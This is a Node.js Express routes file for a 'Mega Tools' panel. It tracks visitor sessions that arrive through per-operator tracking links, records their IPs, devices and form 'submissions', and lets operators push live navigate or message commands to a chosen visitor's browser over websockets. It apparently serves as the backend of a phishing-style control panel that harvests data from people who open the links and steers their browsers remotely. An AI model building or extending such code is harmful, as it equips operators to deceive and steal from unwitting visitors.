// ============================================================
// MEGA TOOLS — SESSIONS ROUTES
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Trash = require('../models/Trash');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate } = require('../middleware/auth');
const { getSessionSockets } = require('../services/sessionManager');
const { toStringId, parseTrackingCode, paginate, now } = require('../utils/helpers');
const CONFIG = require('../config');

// ============================================================
// HELPERS — Backend session filtering utilities
// ============================================================

function isSessionForUser(session, userCode) {
  if (!session || !userCode) return false;
  const tc = session.trackingCode || '';
  return tc === userCode || tc.startsWith(userCode + '_');
}

function isSessionForAnyCode(session, codes) {
  if (!session || !codes || codes.length === 0) return false;
  const tc = session.trackingCode || '';
  return codes.some(code => tc === code || tc.startsWith(code + '_'));
}

async function findLinkBySlug(slug) {
  if (!slug) return null;
  const all = await db.links.read();
  return all.find(l => l.baseCode === slug || l.slug === slug || l.uniqueCode === slug) || null;
}

async function getUserTrackingCodes(userId) {
  return User.getTrackingCodesForUser(userId);
}

async function filterSessionsByRole(sessions, user) {
  if (user.role === ROLES.OWNER) return sessions;
  const codes = await getUserTrackingCodes(user._id);
  const userId = toStringId(user._id);
  let filtered = sessions.filter(s => isSessionForAnyCode(s, codes));
  filtered = filtered.filter(s => {
    if (s.hiddenBy && s.hiddenBy.includes(userId)) return false;
    if (s.trashedBy && s.trashedBy[userId]) return false;
    return true;
  });
  return filtered;
}

async function checkSessionAccess(session, user) {
  if (user.role === ROLES.OWNER) return true;
  const codes = await getUserTrackingCodes(user._id);
  return isSessionForAnyCode(session, codes);
}

// ============================================================
// GET SESSIONS — OPTIMIZED
// ============================================================

router.get('/', authenticate, async (req, res) => {
  try {
    let sessions = await db.sessions.read();
    const pageNum = parseInt(req.query.page) || 1;
    const limitNum = parseInt(req.query.limit) || CONFIG.SESSIONS_PER_PAGE;

    if (req.user.role === ROLES.OWNER) {
      sessions.sort((a, b) => {
        if (a.isLive && !b.isLive) return -1;
        if (!a.isLive && b.isLive) return 1;
        return new Date(b.timestamp) - new Date(a.timestamp);
      });
      const result = paginate(sessions, pageNum, limitNum);
      return res.json({ sessions: result.data, total: result.total, page: result.page, totalPages: result.totalPages, hasMore: result.hasMore });
    }

    sessions.sort((a, b) => {
      if (a.isLive && !b.isLive) return -1;
      if (!a.isLive && b.isLive) return 1;
      return new Date(b.timestamp) - new Date(a.timestamp);
    });

    const codes = await getUserTrackingCodes(req.user._id);
    const userId = toStringId(req.user._id);
    const filtered = [];
    let totalFiltered = 0;

    for (const s of sessions) {
      if (!isSessionForAnyCode(s, codes)) continue;
      if (s.hiddenBy && s.hiddenBy.includes(userId)) continue;
      if (s.trashedBy && s.trashedBy[userId]) continue;
      totalFiltered++;
      if (filtered.length < limitNum) filtered.push(s);
    }

    const totalPages = Math.ceil(totalFiltered / limitNum);
    const startIdx = (pageNum - 1) * limitNum;
    const paginatedSessions = [];
    let count = 0;
    for (const s of sessions) {
      if (!isSessionForAnyCode(s, codes)) continue;
      if (s.hiddenBy && s.hiddenBy.includes(userId)) continue;
      if (s.trashedBy && s.trashedBy[userId]) continue;
      if (count >= startIdx && paginatedSessions.length < limitNum) paginatedSessions.push(s);
      count++;
      if (paginatedSessions.length >= limitNum && count >= startIdx + limitNum) break;
    }

    res.json({ sessions: paginatedSessions, total: totalFiltered, page: pageNum, totalPages, hasMore: pageNum < totalPages });
  } catch (err) {
    console.error('[Sessions] GET error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// STATS SUMMARY — Today's Unique Sessions + Unique Submissions
// ============================================================

router.get('/stats/summary', authenticate, async (req, res) => {
  try {
    let all = await db.sessions.read();
    all = await filterSessionsByRole(all, req.user);

    // Today filter — start of today 00:00:00
    const todayStart = new Date();
    todayStart.setHours(0, 0, 0, 0);
    const todayMs = todayStart.getTime();

    const todaySessions = all.filter(s => {
      const sessionTime = new Date(s.timestamp || s.lastActivity).getTime();
      return sessionTime >= todayMs;
    });

    // Unique visitors today
    const uniqueVisitorIds = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean));

    // Unique submissions today (deduplicated by JSON string)
    const allSubs = [];
    todaySessions.forEach(s => {
      if (s.submissions?.length > 0) {
        s.submissions.forEach(sub => allSubs.push(JSON.stringify(sub)));
      }
    });
    const uniqueSubmissions = new Set(allSubs);

    const calcStats = (sessions) => ({
      live: sessions.filter(s => s.isLive).length,
      mobile: sessions.filter(s => s.deviceType === 'Mobile').length,
      desktop: sessions.filter(s => s.deviceType === 'Desktop').length,
      uniqueSessions: uniqueVisitorIds.size,
      uniqueSubmissions: uniqueSubmissions.size,
      total: sessions.length,
    });

    res.json({ all: calcStats(todaySessions) });
  } catch (err) {
    console.error('[Sessions] Stats error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// ONLINE USERS
// ============================================================

router.get('/online', authenticate, async (req, res) => {
  try {
    const allSessions = await db.sessions.read();
    const allUsers = await db.users.read();
    const nowMs = Date.now();
    const onlineSessions = allSessions.filter(s => {
      const lastActivity = new Date(s.lastActivity || s.timestamp || Date.now()).getTime();
      return (nowMs - lastActivity) < CONFIG.SESSION_TIMEOUT_MS;
    });
    const userIdSet = new Set();
    for (const s of onlineSessions) {
      if (s.trackingCode) {
        const user = allUsers.find(u => u.trackingCode && s.trackingCode.startsWith(u.trackingCode));
        if (user) userIdSet.add(toStringId(user._id));
      }
    }
    const onlineUsers = allUsers.filter(u => userIdSet.has(toStringId(u._id)));
    res.json(onlineUsers.map(u => ({
      _id: toStringId(u._id), name: u.name || u.fullName || u.username || 'Unknown',
      username: u.username || '', email: u.email || '', role: u.role || 'user',
      profilePic: u.profilePic || '', trackingCode: u.trackingCode || '', parentId: u.parentId || null,
    })));
  } catch (err) {
    console.error('[Sessions] Online error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// MOVE TO TRASH — 24h Guard
// ============================================================

router.post('/:id/trash', authenticate, async (req, res) => {
  try {
    const all = await db.sessions.read();
    const session = all.find(s => toStringId(s._id) === req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    const result = await Session.moveToTrash(req.params.id, req.user._id, req.user.role, req.user.name || req.user.username);
    const io = req.app.get('io');
    if (io) {
      io.emit('sessionTrashed', {
        sessionId: req.params.id,
        visitorId: session.visitorId,
        trashedBy: toStringId(req.user._id),
        timestamp: now(),
      });
    }
    res.json({ message: 'Moved to trash', sessionId: req.params.id, isOwner: req.user.role === ROLES.OWNER });
  } catch (err) {
    if (err.code === 'TOO_EARLY_TO_TRASH') {
      const remainingHours = Math.ceil(err.remainingMs / 3600000);
      return res.status(400).json({ 
        message: `Session cannot be trashed yet. Please wait ${remainingHours}h (24h minimum).`,
        code: 'TOO_EARLY_TO_TRASH',
        remainingHours
      });
    }
    console.error('[Sessions] Trash error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HIDE SESSION
// ============================================================

router.post('/:id/hide', authenticate, async (req, res) => {
  try {
    const session = await Session.hideFromUser(req.params.id, req.user._id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    res.json({ message: 'Hidden', sessionId: req.params.id });
  } catch (err) {
    console.error('[Sessions] Hide error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// UNIVERSAL COMMAND — ATOMIC: findByIdAndUpdate
// ============================================================

router.post('/:id/command', authenticate, async (req, res) => {
  try {
    const { action, url, message } = req.body;
    const session = await db.sessions.findById(req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    session.commandSeq = (session.commandSeq || 0) + 1;
    session.lastCommand = action || 'navigate';
    session.lastCommandUrl = url || '';
    session.lastMessage = message || '';
    session.lastActivity = now();
    session.redirectHistory = session.redirectHistory || [];
    session.redirectHistory.push({ action: action || 'navigate', url: url || '', message: message || '', seq: session.commandSeq, timestamp: now() });

    if (url) {
      session.currentUrl = url;
      session.status = 'Online';
      session.clicks = (session.clicks || 0) + 1;
      session.redirectedBy = toStringId(req.user._id);
      const { slug } = parseTrackingCode(url.split('/').filter(Boolean).pop() || url);
      if (slug) {
        const link = await findLinkBySlug(slug);
        if (link) { if (!session.baseCode) session.baseCode = slug; session.linkId = toStringId(link._id); }
      }
    }

    // ATOMIC: Update only this session
    await db.sessions.findByIdAndUpdate(req.params.id, session);

    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = {
      action: action || 'navigate', url: url || '', message: message || '',
      seq: session.commandSeq,
      visitorId: session.visitorId,
      trackingCode: session.trackingCode,
      timestamp: now(),
    };

    if (io && sockets) {
      if (session.visitorId) {
        const socketId = sockets[session.visitorId];
        if (socketId) io.to(socketId).emit('session_command', command);
      }
      if (session.trackingCode) {
        io.to('room_' + session.trackingCode).emit('session_command', command);
      }
    }

    res.json({ success: true, message: 'Command sent', command, sessionId: req.params.id });
  } catch (err) {
    console.error('[Sessions] Command error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// REDIRECT-NEW
// ============================================================

router.post('/:id/redirect-new', authenticate, async (req, res) => {
  req.body.action = req.body.message ? 'navigate+message' : 'navigate';
  req.body.url = req.body.targetUrl;
  req.url = '/' + req.params.id + '/command';
  router.handle(req, res);
});

// ============================================================
// TRASH COLLECTION
// ============================================================

router.get('/trash', authenticate, async (req, res) => {
  try {
    let trash = await Trash.findMany();
    if (req.user.role !== ROLES.OWNER) {
      const codes = await getUserTrackingCodes(req.user._id);
      trash = trash.filter(t => isSessionForAnyCode(t, codes));
    }
    trash.sort((a, b) => new Date(b.trashedAt || b.deletedAt) - new Date(a.trashedAt || a.deletedAt));
    res.json(trash);
  } catch (err) { console.error('[Sessions] Trash list error:', err); res.status(500).json({ message: 'Server error' }); }
});

router.get('/trash/count', authenticate, async (req, res) => {
  try {
    let trash = await Trash.findMany();
    if (req.user.role !== ROLES.OWNER) {
      const codes = await getUserTrackingCodes(req.user._id);
      trash = trash.filter(t => isSessionForAnyCode(t, codes));
    }
    res.json({ count: trash.length });
  } catch (err) { console.error('[Sessions] Trash count error:', err); res.status(500).json({ message: 'Server error' }); }
});

router.delete('/trash/clear', authenticate, async (req, res) => {
  try {
    const userRole = req.user.role;
    const trackingCode = req.user.trackingCode || '';
    let userTrackingCodes = [];

    if (userRole !== ROLES.OWNER) {
      userTrackingCodes = await getUserTrackingCodes(req.user._id);
    }

    const result = await Trash.clearAll({ trackingCode, userRole, userTrackingCodes });
    res.json({ message: `Cleared ${result.cleared} trash items`, count: result.cleared });
  } catch (err) { console.error('[Sessions] Trash clear error:', err); res.status(500).json({ message: 'Server error' }); }
});

module.exports = router;